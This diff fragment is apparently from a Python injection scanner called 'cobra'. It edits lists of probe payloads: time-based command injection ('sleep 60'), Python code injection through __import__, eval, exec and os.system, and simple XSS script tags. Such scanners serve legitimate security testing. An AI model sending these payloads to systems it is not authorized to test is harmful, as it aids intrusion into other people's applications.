@@ -11,8 +11,8 @@ GREEN = "\033[0;32m"
 def cobra(host,delay=0):
     hits = []
 
-    mal_command = ["sleep 60", "sleep \\6\\0"]
-    mal_python = [r"__import__('time').sleep(60)", r"__import__('os').system('sleep 60')",r'eval("__import__(\'time\').sleep(60)")',r'eval("__import__(\'os\').system(\'sleep 60\')")',r'exec("__import__(\'time\').sleep(60)")',r'exec("__import__(\'os\').system(\'sleep 60\')")','exec("import time\ntime.sleep(60)"','exec("import os\nos.system(\'sleep 60\')")']
+    mal_command = [r"sleep 60", r"sleep \\6\\0"]
+    mal_python = [r"time.sleep(60)" ,r"__import__('time').sleep(60)", r"__import__('os').system('sleep 60')",r'eval("__import__(\'time\').sleep(60)")',r'eval("__import__(\'os\').system(\'sleep 60\')")',r'exec("__import__(\'time\').sleep(60)")',r'exec("__import__(\'os\').system(\'sleep 60\')")',r'exec("import time\ntime.sleep(60)"',r'exec("import os\nos.system(\'sleep 60\')")']
     mal_xss = ["<iframe>Cobra</iframe>", "<script>alert('Cobra')</script>", "<script>prompt('Cobra')</script>", "<strong>cobra</strong>"]
 
     if re.search("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",host):
